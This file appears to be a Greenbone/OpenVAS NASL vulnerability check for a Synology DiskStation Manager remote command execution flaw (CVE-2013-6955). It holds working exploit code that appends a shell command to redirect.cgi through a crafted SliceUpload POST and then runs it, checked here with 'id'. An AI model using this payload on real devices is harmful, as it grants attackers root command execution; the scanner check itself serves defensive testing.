# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:synology:diskstation_manager";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103869");
  script_cve_id("CVE-2013-6955");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("2024-06-28T15:38:46+0000");

  script_name("Synology DiskStation Manager (DSM) 'imageSelector.cgi' RCE Vulnerability - Active Check");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/64516");

  script_tag(name:"last_modification", value:"2024-06-28 15:38:46 +0000 (Fri, 28 Jun 2024)");
  script_tag(name:"creation_date", value:"2014-01-07 14:57:33 +0100 (Tue, 07 Jan 2014)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("gb_synology_dsm_consolidation.nasl");
  script_mandatory_keys("synology/dsm/http/detected");
  script_require_ports("Services/www", 5000);

  script_tag(name:"summary", value:"Synology DiskStation Manager (DSM) is prone to a remote command
  execution (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"This script tries to execute the 'id' command on the remote
  host using specially crafted requests.");

  script_tag(name:"insight", value:"Synology DSM contains a flaw in the SliceUpload functionality
  provided by /webman/imageSelector.cgi. With a specially crafted request, a remote attacker can
  append data to files, allowing for the execution of arbitrary commands.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary commands
  with root privileges.");

  script_tag(name:"affected", value:"Synology DiskStation Manager 4.x are vulnerable. Other versions may
  also be affected.");

  script_tag(name:"solution", value:"Updates are available.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

useragent = http_get_user_agent();
vtstrings = get_vt_strings();
vtstring = vtstrings["default"];
vtstring_lower = vtstrings["lowercase"];

host = http_host_name(port:port);

function send_post_request ( cmd )
{
  local_var req, buf, len, data, boundary;

  boundary = '_' + vtstring + '_' + rand();

  data = '--' + boundary + '\r\n' +
        'Content-Disposition: form-data; name="source"\r\n' +
        '\r\n' +
        'login\r\n' +
        '  --' + boundary + '\r\n' +
        'Content-Disposition: form-data; name="type"\r\n' +
        '\r\n' +
        'logo\r\n' +
        '  --' + boundary + '\r\n' +
        'Content-Disposition: form-data; name="' + vtstring_lower + '"; filename="' + vtstring_lower + '"\r\n' +
        'Content-Type: application/octet-stream\r\n' +
        '\r\n' +
        "sed -i -e '/sed -i -e/,$d' /usr/syno/synoman/redirect.cgi" + '\n' +
        cmd + '\r\n' +
        '  --' + boundary + '--';

  len = strlen( data );

  req = 'POST /webman/imageSelector.cgi HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'User-Agent: ' + useragent + '\r\n' +
        'X-TYPE-NAME: SLICEUPLOAD\r\n' +
        'X-TMP-FILE: /usr/syno/synoman/redirect.cgi\r\n' +
        'Content-Type: multipart/form-data; boundary=' + boundary + '\r\n' +
        'Content-Length: ' + len + '\r\n' +
        '\r\n' +
        data;

  buf = http_send_recv( port:port, data:req, bodyonly:FALSE );

  if ( "error_noprivilege" >< buf ) return TRUE;
}

function send_get_request()
{
  local_var req, buf;

  req = 'GET /redirect.cgi HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'User-Agent: ' + useragent + '\r\n' +
        'Content-Type: application/x-www-form-urlencoded\r\n' +
        'Content-Length: 0\r\n\r\n';

  buf = http_send_recv( port:port, data:req, bodyonly:FALSE );

  if( buf )
    return buf;
}

if ( send_post_request( cmd:'id' ) )
{
  buf = send_get_request();
  if ( buf =~ 'uid=[0-9]+.*gid=[0-9]+.*' )
  {
    report = 'It was possible to execute the "id" command on the remote host\nwhich produces the following output:\n\n' + buf;
    security_message( port:port, data:report );
    send_post_request( cmd:'' ); # cleanup
    exit( 0 );
  }
}

exit( 99 );
